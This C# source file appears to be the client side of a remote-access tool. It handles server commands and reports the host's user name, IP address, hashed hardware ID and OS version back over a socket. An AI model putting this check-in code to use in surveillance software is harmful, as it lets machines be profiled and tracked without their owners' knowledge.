using System;
using System.Collections.Generic;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Runtime.InteropServices.ComTypes;
using System.Security.Cryptography;
using System.Net.Sockets;

namespace Client.Connection
{
    class CommandReaderClient
    {
        public static async void DataProcess(string tag, byte[] dataBuff)
        {
            await Task.Run(() =>
            {
                try
                {
                    byte[] data;
                    switch (tag.Split('|')[0])
                    {
                        case "<WELCOME>":
                            string text = Encoding.UTF8.GetString(dataBuff);
                            Console.WriteLine("Received by Server >> " + text);
                            data = ConnectClient.MyDataPacker("SCCS", Encoding.UTF8.GetBytes("Command Successfully completed!"));
                            break;
                        case "<ID>":
                            int id = int.Parse(Encoding.UTF8.GetString(dataBuff));
                            data = ConnectClient.MyDataPacker("INFO", Encoding.UTF8.GetBytes(ClientRequest.GetCLientInfo(id)));
                            ConnectClient.sck.Send(data, 0, data.Length, SocketFlags.None);
                            break;
                    }
                }
                catch { }

            });
        }
    }


    class ClientRequest
    {
        public static string GetCLientInfo(int id)
        {
            return id.ToString() + "[KORGI]" + PcName + "[KORGI]" + GetIp() + "[KORGI]" + HWID() + "[KORGI]" + OSVersion + "[KORGI]" +
                   DateTime.Now.ToString();
        }


        /**   - Client info -   **/
        /// <summary>
        ///   Get Client ip
        /// </summary>
        /// <returns>IP</returns>
        public static string GetIp()
        {
            var host = Dns.GetHostEntry(Dns.GetHostName());
            foreach (var ip in host.AddressList)
            {
                if (ip.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
                {
                    return ip.ToString();
                }
            }
            return "N/A";
        }

        /// <summary>
        ///  Get Client Machine Name
        /// </summary>
        public static string MachineName = Environment.MachineName;


        public static string PcName = Environment.UserName;


        /// <summary>
        ///  Get Client HWID
        /// </summary>
        public static string HWID()
        {
            try
            {
                string strToHash = string.Concat(Environment.ProcessorCount, Environment.UserName,
                    Environment.MachineName, Environment.OSVersion
                    , new DriveInfo(Path.GetPathRoot(Environment.SystemDirectory)).TotalSize);
                MD5CryptoServiceProvider md5Obj = new MD5CryptoServiceProvider();
                byte[] bytesToHash = Encoding.ASCII.GetBytes(strToHash);
                bytesToHash = md5Obj.ComputeHash(bytesToHash);
                StringBuilder strResult = new StringBuilder();
                foreach (byte b in bytesToHash)
                    strResult.Append(b.ToString("x2"));
                return strResult.ToString().Substring(0, 20).ToUpper();
            }
            catch
            {
                return "Err HWID";
            }
        }


        /// <summary>
        ///  Get Client OS Version
        /// </summary>
        public static string OSVersion = Environment.OSVersion.ToString();


    }
}
